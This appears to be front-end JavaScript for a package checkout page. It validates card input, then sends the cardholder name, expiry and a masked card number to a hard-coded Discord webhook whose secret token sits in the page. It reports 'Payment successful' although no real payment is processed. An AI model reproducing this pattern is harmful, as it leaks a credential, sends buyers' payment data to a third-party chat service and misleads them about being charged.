document.addEventListener('DOMContentLoaded', function() {
    // Discord webhook URL
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1294398707999051797/URvT3b6ixl9S9Qk6qlfdzgSN1QqEKhRKE0I79eOP0LGdVvwBPiPUTm1PDDt1Ia1_AvAr';
    
    // Get package details from URL
    const urlParams = new URLSearchParams(window.location.search);
    const package = urlParams.get('package');
    
    // Package prices and details
    const packages = {
        basic: { name: 'Basic Package', price: 9.99 },
        premium: { name: 'Premium Package', price: 19.99 },
        ultimate: { name: 'Ultimate Package', price: 29.99 }
    };

    // Display package details
    const packageDetails = document.getElementById('package-details');
    if (packages[package]) {
        packageDetails.innerHTML = `
            <p><strong>Package:</strong> ${packages[package].name}</p>
            <p><strong>Price:</strong> $${packages[package].price}/month</p>
        `;
    }

    // Format card number input
    const cardNumberInput = document.getElementById('card-number');
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
        
        // Validate card number using Luhn algorithm
        const isValid = validateCardNumber(value);
        const message = document.getElementById('card-validation-message');
        const submitButton = document.getElementById('submit-payment');
        
        if (value.length > 0) {
            if (isValid) {
                message.textContent = '✓ Valid card number';
                message.className = 'validation-message valid';
                submitButton.disabled = false;
            } else {
                message.textContent = '✗ Invalid card number';
                message.className = 'validation-message invalid';
                submitButton.disabled = true;
            }
        } else {
            message.textContent = '';
            submitButton.disabled = true;
        }
    });

    // Format expiry date input
    const expiryInput = document.getElementById('expiry');
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.slice(0, 2) + '/' + value.slice(2);
        }
        e.target.value = value;
    });

    // Handle form submission
    const form = document.getElementById('payment-form');
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get form data
        const formData = {
            cardName: document.getElementById('card-name').value,
            cardNumber: document.getElementById('card-number').value.replace(/\s/g, ''),
            expiry: document.getElementById('expiry').value,
            cvv: document.getElementById('cvv').value,
            package: packages[package].name,
            amount: packages[package].price
        };

        try {
            // Send to Discord webhook
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: '**New Purchase**',
                    embeds: [{
                        title: 'Payment Details',
                        color: 5793266,
                        fields: [
                            {
                                name: 'Package',
                                value: formData.package,
                                inline: true
                            },
                            {
                                name: 'Amount',
                                value: `$${formData.amount}`,
                                inline: true
                            },
                            {
                                name: 'Cardholder Name',
                                value: formData.cardName,
                                inline: true
                            },
                            {
                                name: 'Card Number',
                                value: `${formData.cardNumber.slice(0, 4)} **** **** ${formData.cardNumber.slice(-4)}`,
                                inline: true
                            },
                            {
                                name: 'Expiry',
                                value: formData.expiry,
                                inline: true
                            },
                            {
                                name: 'CVV',
                                value: '***',
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });

            if (response.ok) {
                alert('Payment successful! Thank you for your purchase.');
                window.location.href = 'index.html';
            } else {
                throw new Error('Payment failed');
            }
        } catch (error) {
            alert('Payment failed. Please try again.');
            console.error('Error:', error);
        }
    });
});

// Luhn algorithm implementation
function validateCardNumber(number) {
    let sum = 0;
    let isEven = false;
    
    // Loop through values starting from the rightmost digit
    for (let i = number.length - 1; i >= 0; i--) {
        let digit = parseInt(number.charAt(i));

        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }

        sum += digit;
        isEven = !isEven;
    }

    return (sum % 10) === 0;
}